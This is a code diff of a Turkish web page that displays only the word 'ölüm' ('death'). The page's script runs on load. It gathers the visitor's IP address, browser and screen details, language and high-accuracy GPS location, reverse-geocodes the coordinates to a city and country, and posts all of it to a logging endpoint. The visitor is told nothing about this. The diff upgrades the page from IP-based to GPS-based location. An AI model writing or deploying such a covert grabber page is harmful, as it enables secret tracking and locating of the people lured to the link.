@@ -1,84 +1,105 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Ölüm</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background-color: black;
-      color: red;
-      font-size: 50px;
-      font-weight: bold;
-      text-align: center;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: red;
+            font-size: 50px;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-  ölüm
+    ölüm
 
-  <script>
-    
-    async function getIPLocation() {
-      try {
-        const res = await fetch('http://ip-api.com/json/'); 
-        const data = await res.json();
-        // ip-api dönen örnek JSON (başarılı sonuç için "status": "success" olmalı)
-        // {
-        //   "status": "success",
-        //   "country": "Turkey",
-        //   "countryCode": "TR",
-        //   "region": "34",
-        //   "regionName": "Istanbul",
-        //   "city": "Istanbul",
-        //   "zip": "34000",
-        //   "lat": 41.0138,
-        //   "lon": 28.9497,
-        //   "timezone": "Europe/Istanbul",
-        //   "isp": "TTNet A.S.",
-        //   "org": "Turk Telekomunikasyon Anonim Sirketi",
-        //   "as": "AS9121 TURK TELEKOMUNIKASYON ANONIM SIRKETI",
-        //   "query": "X.X.X.X"
-        // }
-        return data;
-      } catch (error) {
-        console.error("IP konum verisi alınırken hata oluştu:", error);
-        return null;
-      }
-    }
+    <script>
+        async function getUserIP() {
+            try {
+                const res = await fetch('https://api64.ipify.org?format=json'); 
+                const data = await res.json();
+                return data.ip;
+            } catch (error) {
+                console.error("IP alınırken hata oluştu:", error);
+                return "Bilinmeyen";
+            }
+        }
 
-    async function sendData() {
-      const ipData = await getIPLocation();
+        async function getLocationFromCoords(latitude, longitude) {
+            try {
+                // zoom=18 & addressdetails=1 ile daha ayrıntılı bilgi istenir
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
+                const data = await res.json();
+                
+                // data.address varsa yoksa kontrolleri
+                const country = data.address && data.address.country ? data.address.country : "Bilinmeyen";
+                const city = data.address && (data.address.city || data.address.town || data.address.village)
+                    ? (data.address.city || data.address.town || data.address.village)
+                    : "Bilinmeyen";
 
-      
-      let userData = {
-        ip: ipData?.query || "Bilinmeyen IP",
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        language: navigator.language,
-        location: ipData && ipData.status === "success"
-          ? `${ipData.city}, ${ipData.country}`
-          : "Konum alınamadı",
-        latitude: ipData?.lat || null,
-        longitude: ipData?.lon || null
-      };
+                return { country, city };
+            } catch (error) {
+                console.error("GPS konum alınırken hata oluştu:", error);
+                return { country: "Bilinmeyen", city: "Bilinmeyen" };
+            }
+        }
 
-     
-      fetch('/api/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(userData)
-      });
-    }
+        function getGPSLocation() {
+            return new Promise((resolve, reject) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            const location = await getLocationFromCoords(latitude, longitude);
+                            resolve({ latitude, longitude, location });
+                        },
+                        (error) => {
+                            console.error("Konum izni reddedildi veya hata oluştu:", error);
+                            resolve(null);
+                        },
+                        // Yüksek hassasiyet ve zaman aşımı parametreleri
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                } else {
+                    console.error("Tarayıcı konum API'sini desteklemiyor.");
+                    resolve(null);
+                }
+            });
+        }
 
-    
-    sendData();
-  </script>
+        async function sendData() {
+            const ip = await getUserIP();
+            let locationData = await getGPSLocation();
+
+            let userData = {
+                ip: ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                language: navigator.language,
+                location: locationData ? `${locationData.location.city}, ${locationData.location.country}` : "Konum alınamadı",
+                latitude: locationData ? locationData.latitude : null,
+                longitude: locationData ? locationData.longitude : null
+            };
+
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(userData)
+            });
+        }
+
+        sendData(); // Sayfa açılınca çalıştır
+    </script>
 </body>
 </html>
